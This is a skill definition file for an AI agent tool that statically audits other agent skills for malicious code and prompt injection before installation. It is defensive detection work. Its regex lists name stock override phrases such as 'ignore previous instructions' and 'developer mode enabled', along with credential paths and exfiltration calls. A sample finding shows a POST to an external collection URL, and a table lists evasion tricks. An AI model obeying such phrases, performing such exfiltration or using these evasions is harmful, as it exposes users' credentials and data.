---
name: skill-security-auditor
description: >
  Security audit and vulnerability scanning for AI agent skills before
  installation. Detects prompt injection in SKILL.md files, dangerous code
  patterns (eval, exec, subprocess), network exfiltration, credential
  harvesting, dependency supply chain risks, file system boundary violations,
  and obfuscation. Produces PASS/WARN/FAIL verdicts with remediation guidance.
  Use when evaluating untrusted skills, pre-install security gates, or auditing
  skill repositories.
license: MIT + Commons Clause
metadata:
  version: 1.0.0
  author: borghei
  category: engineering
  domain: ai-security
  tier: POWERFUL
  updated: 2026-03-09
  frameworks: static-analysis, supply-chain-security
---
# Skill Security Auditor

**Tier:** POWERFUL
**Category:** Engineering / Security
**Maintainer:** Claude Skills Team

## Overview

Scan and audit AI agent skills for security risks before installation. Performs static analysis on code files for dangerous patterns, scans markdown files for prompt injection, validates dependency supply chains, checks file system boundaries, and detects obfuscation. Produces a structured PASS / WARN / FAIL verdict with findings categorized by severity and actionable remediation guidance.

## Keywords

skill security, AI security, prompt injection, code audit, supply chain, dependency scanning, data exfiltration, credential harvesting, obfuscation detection, pre-install security

## Core Capabilities

### 1. Code Execution Risk Detection
- Command injection: `os.system()`, `subprocess.call(shell=True)`, backtick execution
- Code execution: `eval()`, `exec()`, `compile()`, `__import__()`
- Obfuscation: base64-encoded payloads, hex strings, `chr()` chains
- Network exfiltration: `requests.post()`, `socket.connect()`, `httpx`, `aiohttp`
- Credential harvesting: reads from `~/.ssh`, `~/.aws`, `~/.config`
- Privilege escalation: `sudo`, `chmod 777`, `setuid`, cron manipulation

### 2. Prompt Injection Detection
- System prompt override: "Ignore previous instructions"
- Role hijacking: "Act as root", "Pretend you have no restrictions"
- Safety bypass: "Skip safety checks", "Disable content filtering"
- Hidden instructions: zero-width characters, HTML comments with directives
- Data extraction: "Send contents of", "Upload file to", "POST to"
- Excessive permissions: "Run any command", "Full filesystem access"

### 3. Supply Chain Analysis
- Known vulnerabilities in pinned dependencies
- Typosquatting detection (packages similar to popular ones)
- Unpinned versions that may introduce vulnerabilities
- `pip install` or `npm install` commands inside scripts
- Packages with low download counts or recent creation dates

### 4. File System and Structure Validation
- Scripts referencing paths outside skill directory
- Hidden files (.env, dotfiles) that should not be in a skill
- Unexpected binary files (.exe, .so, .dll)
- Symbolic links pointing outside the skill boundary
- Large files that could hide payloads

## When to Use

- Evaluating a skill from an untrusted source before installation
- Pre-install security gate for CI/CD pipelines
- Auditing a skill directory or git repository for malicious code
- Reviewing skills before adding them to a team's approved list
- Post-incident scanning of installed skills

## Threat Model

### Attack Vectors Against AI Skills

| Vector | How It Works | Risk Level |
|--------|-------------|------------|
| **Code execution in scripts** | Skill includes Python/Bash scripts with `eval()`, `os.system()`, or `subprocess` that execute arbitrary commands | CRITICAL |
| **Prompt injection in SKILL.md** | Markdown contains hidden instructions that override the AI assistant's behavior when the skill is loaded | CRITICAL |
| **Network exfiltration** | Scripts send local data (code, credentials, env vars) to external servers | CRITICAL |
| **Credential harvesting** | Scripts read SSH keys, AWS credentials, or API tokens from well-known paths | CRITICAL |
| **Dependency poisoning** | `requirements.txt` includes typosquatted or backdoored packages | HIGH |
| **File system escape** | Scripts write to `~/.bashrc`, `/etc/`, or other system locations | HIGH |
| **Obfuscated payloads** | Malicious code hidden via base64 encoding, hex strings, or `chr()` construction | HIGH |
| **Binary payloads** | Pre-compiled executables bypass code review | HIGH |
| **Symlink attacks** | Symbolic links redirect file operations to sensitive locations | MEDIUM |
| **Information disclosure** | Excessive logging or error output reveals system information | LOW |

### Trust Boundaries

```
TRUSTED ZONE:
  ├── Skill markdown files (SKILL.md, references/)
  │   └── Should contain ONLY documentation and templates
  ├── Configuration files (YAML, JSON, TOML)
  │   └── Should contain ONLY settings, no executable code
  └── Template files (assets/)
      └── Should contain ONLY user-facing templates

INSPECTION REQUIRED:
  ├── Python scripts (scripts/*.py)
  │   └── May contain legitimate automation — inspect each function
  ├── Shell scripts (scripts/*.sh)
  │   └── Check for pipes to external servers, eval, sudo
  └── JavaScript/TypeScript (scripts/*.js, *.ts)
      └── Check for eval, Function constructor, network calls

REJECT BY DEFAULT:
  ├── Binary files (.exe, .so, .dll, .pyc)
  ├── Hidden directories (.hidden/)
  ├── Environment files (.env, .env.local)
  └── Credential files (*.pem, *.key, *.p12)
```

## Scanning Patterns

### Code Execution Risks

```python
# Patterns to detect in .py, .sh, .js, .ts files

CRITICAL_PATTERNS = {
    "command_injection": [
        r"os\.system\(",
        r"os\.popen\(",
        r"subprocess\.call\(.*shell\s*=\s*True",
        r"subprocess\.Popen\(.*shell\s*=\s*True",
        r"`[^`]+`",  # backtick execution in shell
    ],
    "code_execution": [
        r"\beval\(",
        r"\bexec\(",
        r"\bcompile\(",
        r"__import__\(",
        r"importlib\.import_module\(",
        r"new\s+Function\(",  # JavaScript
    ],
    "obfuscation": [
        r"base64\.b64decode\(",
        r"codecs\.decode\(",
        r"bytes\.fromhex\(",
        r"chr\(\d+\)\s*\+\s*chr\(",  # chr() chains
        r"\\x[0-9a-f]{2}.*\\x[0-9a-f]{2}.*\\x[0-9a-f]{2}",  # hex strings
    ],
    "network_exfiltration": [
        r"requests\.post\(",
        r"requests\.put\(",
        r"urllib\.request\.urlopen\(",
        r"httpx\.(post|put)\(",
        r"aiohttp\.ClientSession\(",
        r"socket\.connect\(",
        r"fetch\(['\"]https?://",  # JavaScript
    ],
    "credential_harvesting": [
        r"~/.ssh",
        r"~/.aws",
        r"~/.config",
        r"~/.gnupg",
        r"os\.environ\[",  # reading env vars
        r"open\(.*\.pem",
        r"open\(.*\.key",
    ],
    "privilege_escalation": [
        r"\bsudo\b",
        r"chmod\s+777",
        r"chmod\s+\+s",
        r"crontab",
        r"setuid",
    ],
}

HIGH_PATTERNS = {
    "unsafe_deserialization": [
        r"pickle\.loads?\(",
        r"yaml\.load\([^)]*\)",  # without SafeLoader
        r"marshal\.loads?\(",
        r"shelve\.open\(",
    ],
    "file_system_abuse": [
        r"open\(.*/etc/",
        r"open\(.*~/.bashrc",
        r"open\(.*~/.profile",
        r"open\(.*~/.zshrc",
        r"os\.symlink\(",
        r"shutil\.(rmtree|move)\(",
    ],
}
```

### Prompt Injection Detection

```python
# Patterns to detect in .md files

PROMPT_INJECTION_PATTERNS = {
    "system_override": [
        r"ignore\s+(all\s+)?previous\s+instructions",
        r"ignore\s+(all\s+)?prior\s+instructions",
        r"disregard\s+(all\s+)?previous",
        r"you\s+are\s+now\s+(a|an)\s+",
        r"from\s+now\s+on\s+(you|your)\s+",
        r"new\s+system\s+prompt",
        r"override\s+system",
    ],
    "role_hijacking": [
        r"act\s+as\s+(root|admin|superuser)",
        r"pretend\s+you\s+(have\s+no|don't\s+have)\s+restrictions",
        r"you\s+have\s+no\s+limitations",
        r"unrestricted\s+mode",
        r"developer\s+mode\s+enabled",
        r"jailbreak",
    ],
    "safety_bypass": [
        r"skip\s+safety\s+checks",
        r"disable\s+content\s+filter",
        r"bypass\s+security",
        r"remove\s+(all\s+)?guardrails",
        r"no\s+restrictions\s+apply",
    ],
    "data_extraction": [
        r"send\s+(the\s+)?contents?\s+of",
        r"upload\s+file\s+to",
        r"POST\s+to\s+https?://",
        r"exfiltrate",
        r"transmit\s+data\s+to",
    ],
    "hidden_instructions": [
        r"\u200b",          # zero-width space
        r"\u200c",          # zero-width non-joiner
        r"\u200d",          # zero-width joiner
        r"\ufeff",          # byte order mark
        r"<!--\s*(?:system|instruction|command)",  # HTML comments with directives
    ],
}
```

## Audit Report Format

```
+=============================================+
|  SKILL SECURITY AUDIT REPORT                |
|  Skill: example-skill                       |
|  Date: 2026-03-09                           |
|  Verdict: FAIL                              |
+=============================================+
|  CRITICAL: 2  |  HIGH: 1  |  INFO: 3       |
+=============================================+

CRITICAL [CODE-EXEC] scripts/helper.py:42
  Pattern: eval(user_input)
  Risk: Arbitrary code execution from untrusted input
  Fix: Replace eval() with ast.literal_eval() or explicit parsing

CRITICAL [NET-EXFIL] scripts/analyzer.py:88
  Pattern: requests.post("https://external.com/collect", data=results)
  Risk: Data exfiltration to external server
  Fix: Remove outbound network calls or verify destination is trusted
  and explicitly documented

HIGH [FS-BOUNDARY] scripts/scanner.py:15
  Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
  Risk: Reads SSH private key outside skill scope
  Fix: Remove filesystem access outside skill directory

INFO [DEPS-UNPIN] requirements.txt:3
  Pattern: requests>=2.0
  Risk: Unpinned dependency may introduce vulnerabilities
  Fix: Pin to specific version: requests==2.31.0

INFO [LARGE-FILE] assets/data.bin (2.4MB)
  Risk: Large binary file may hide payloads
  Fix: Verify file contents or remove if unnecessary

INFO [SUBPROCESS-SAFE] scripts/lint.py:22
  Pattern: subprocess.run(["ruff", "check", "."])
  Note: Safe usage with list args and no shell=True
```

## Verdict Criteria

| Verdict | Criteria | Action |
|---------|----------|--------|
| **PASS** | Zero CRITICAL, zero HIGH findings | Safe to install |
| **WARN** | Zero CRITICAL, one or more HIGH findings | Review HIGH findings manually before installing |
| **FAIL** | One or more CRITICAL findings | Do NOT install without remediation |

### Strict Mode

In strict mode (for CI/CD gates), any HIGH finding upgrades the verdict to FAIL.

## CI/CD Integration

```yaml
# .github/workflows/audit-skills.yml
name: Skill Security Audit
on:
  pull_request:
    paths:
      - 'skills/**'
      - 'engineering/**'

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Audit changed skills
        run: |
          CHANGED_SKILLS=$(git diff --name-only origin/main... | grep -oP '(skills|engineering)/[^/]+' | sort -u)
          EXIT=0
          for skill in $CHANGED_SKILLS; do
            echo "Auditing: $skill"
            python3 scripts/skill_security_auditor.py "$skill" --strict --json >> audit-results.jsonl
            if [ $? -ne 0 ]; then EXIT=1; fi
          done
          exit $EXIT

      - name: Upload audit results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: skill-audit-results
          path: audit-results.jsonl
```

## Manual Audit Checklist

When automated scanning is not available, use this manual checklist:

```markdown
### Code Files (.py, .sh, .js, .ts)
- [ ] No eval(), exec(), or compile() calls
- [ ] No os.system() or subprocess with shell=True
- [ ] No outbound network requests (requests.post, fetch, socket)
- [ ] No reads from ~/.ssh, ~/.aws, ~/.config, or other user directories
- [ ] No writes outside the skill directory
- [ ] No base64 decoding of unknown payloads
- [ ] No sudo, chmod 777, or privilege escalation
- [ ] No pickle.loads() or unsafe YAML loading
- [ ] subprocess calls use list arguments, not strings

### Markdown Files (SKILL.md, references/*.md)
- [ ] No "ignore previous instructions" or similar overrides
- [ ] No "act as root/admin" or role hijacking
- [ ] No hidden zero-width characters (paste into a hex editor to check)
- [ ] No HTML comments containing instructions
- [ ] No instructions to send data to external URLs
- [ ] No requests for "full filesystem access" or "run any command"

### Dependencies (requirements.txt, package.json)
- [ ] All versions pinned to exact (==, not >=)
- [ ] Package names verified against official repositories
- [ ] No typosquatting (reqeusts, colourma, etc.)
- [ ] No pip install or npm install commands in scripts

### File Structure
- [ ] No .env or credential files
- [ ] No binary executables (.exe, .so, .dll)
- [ ] No symbolic links
- [ ] No files larger than 1MB without clear justification
- [ ] No hidden directories (.hidden/)
```

## Known Evasion Techniques

Attackers may try to bypass detection. Be aware of:

| Technique | Example | Detection Difficulty |
|-----------|---------|---------------------|
| String concatenation | `e` + `v` + `a` + `l` | Medium — check for dynamic function construction |
| `getattr` dispatch | `getattr(os, 'sys' + 'tem')('cmd')` | Hard — requires control flow analysis |
| Import aliasing | `from os import system as helper` | Medium — track import aliases |
| Encoded payloads | `exec(base64.b64decode('...'))` | Easy — flag any base64 decode + exec |
| Time-delayed triggers | Executes only after specific date | Hard — requires dynamic analysis |
| Conditional activation | Triggers only on specific hostnames | Hard — requires dynamic analysis |
| Unicode homoglyphs | Using Cyrillic characters that look like Latin | Medium — normalize Unicode before scanning |

## Limitations

- **Static analysis only** — does not execute code; cannot detect runtime-only behavior
- **Pattern-based detection** — sufficiently creative obfuscation may bypass detection
- **No live CVE database** — dependency checks use local patterns, not real-time vulnerability feeds
- **Cannot detect logic bombs** — time-delayed or conditional payloads require dynamic analysis
- **Limited to known patterns** — novel attack techniques may not be covered

**When in doubt after an audit, do not install.** Ask the skill author for clarification on any flagged patterns.

## Common Pitfalls

- **Trusting skills from "official" sources without auditing** — supply chain attacks target popular packages
- **Skipping audit for "small" skills** — a single `eval()` in a 10-line script is enough
- **Auditing only code, not markdown** — prompt injection in SKILL.md is a real attack vector
- **Ignoring INFO findings** — they accumulate and indicate poor security hygiene
- **No re-audit after skill updates** — each version needs independent verification

## Best Practices

1. **Audit before install, always** — treat every skill as untrusted until verified
2. **Use strict mode in CI** — any HIGH finding blocks the merge
3. **Pin all dependencies** — unpinned versions are a supply chain risk
4. **Verify package names** — typosquatting is common and effective
5. **Check file boundaries** — skills should never access paths outside their directory
6. **Re-audit on updates** — each new version may introduce new risks
7. **Maintain an approved skill list** — pre-audited skills that the team trusts
8. **Report suspicious skills** — notify the skill repository maintainer and community

## Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| False positive on `subprocess.run()` with list arguments | Pattern matches any `subprocess` usage regardless of shell parameter | Verify the call uses a list (not a string) and `shell=True` is absent; mark as INFO, not CRITICAL |
| Prompt injection flagged in legitimate SKILL.md documentation | Phrases like "ignore previous" appear in educational or example text | Wrap examples in fenced code blocks; the scanner should skip content inside triple-backtick blocks |
| Audit reports zero findings on a skill with known issues | Skill uses an unsupported language or evasion technique not in the pattern set | Supplement with the Manual Audit Checklist and inspect files line-by-line for the known issue |
| Large binary file triggers FAIL but the file is a required dataset | Any binary over 1 MB defaults to HIGH severity | Verify the file contents independently (e.g., `file` command, hex dump) and document an explicit exception in the audit report |
| Dependency typosquatting check produces false negatives | Levenshtein distance threshold is too lenient for short package names | Cross-reference every dependency against the official PyPI or npm registry manually before approving |
| CI pipeline audit step times out on monorepo PRs | Scanner processes every changed skill sequentially | Limit the scan to only the skills modified in the PR using the `git diff` path filter shown in the CI/CD section |
| Audit verdict is WARN but team policy requires PASS | Default mode allows HIGH findings to produce WARN instead of FAIL | Enable `--strict` mode so any HIGH finding escalates the verdict to FAIL |

## Success Criteria

- **Zero CRITICAL findings on install**: Every skill deployed to production passes the audit with zero CRITICAL-severity findings.
- **Audit coverage >= 100% of new skills**: No skill is installed or merged without a completed security audit report on file.
- **False positive rate < 15%**: Fewer than 15% of flagged findings are confirmed false positives after manual review.
- **Mean time to audit < 5 minutes per skill**: A standard skill package (under 20 files) completes the full scan in under 5 minutes.
- **Remediation turnaround < 24 hours**: CRITICAL and HIGH findings are resolved or explicitly risk-accepted within one business day.
- **CI gate adoption = 100% of skill repositories**: Every repository that hosts skills runs the audit workflow on every pull request.
- **Re-audit compliance >= 95%**: At least 95% of skills are re-audited within one release cycle after any version update.

## Scope & Limitations

**This skill covers:**
- Static pattern-based detection of dangerous code constructs in Python, Bash, JavaScript, and TypeScript files
- Prompt injection scanning across all markdown files within a skill package
- Dependency supply chain validation for `requirements.txt` and `package.json`
- File structure boundary checks including symlinks, binaries, hidden files, and oversized payloads

**This skill does NOT cover:**
- Runtime or dynamic analysis — code is never executed during the audit (see `skill-tester` for runtime validation)
- Live CVE database lookups or real-time vulnerability feeds (see `dependency-auditor` for active CVE scanning)
- Infrastructure-level security controls such as network segmentation, container hardening, or cloud IAM policies (see `infrastructure-compliance-auditor` in ra-qm-team)
- Compliance framework certification against ISO 27001, SOC 2, GDPR, or other regulatory standards (see `information-security-manager-iso27001` and `gdpr-dsgvo-expert` in ra-qm-team)

## Integration Points

| Skill | Integration | Data Flow |
|-------|-------------|-----------|
| `dependency-auditor` | Feed audit findings into live CVE scanning for flagged dependencies | Security audit report → dependency-auditor for real-time vulnerability lookup |
| `ci-cd-pipeline-builder` | Embed the audit workflow as a required check in generated CI/CD pipelines | Pipeline template ← audit job YAML from this skill's CI/CD section |
| `skill-tester` | Run dynamic runtime tests on skills that pass static analysis | PASS verdict from this skill → skill-tester for behavioral validation |
| `infrastructure-compliance-auditor` | Extend auditing scope from skill-level to infrastructure-level security controls | Skill audit findings → infrastructure auditor for environment-wide posture review |
| `env-secrets-manager` | Cross-reference credential harvesting findings with secrets management policy | Credential-access flags from audit → env-secrets-manager for policy verification |
| `pr-review-expert` | Surface audit findings as inline PR review comments on flagged lines | Audit report line references → PR review annotations for developer visibility |
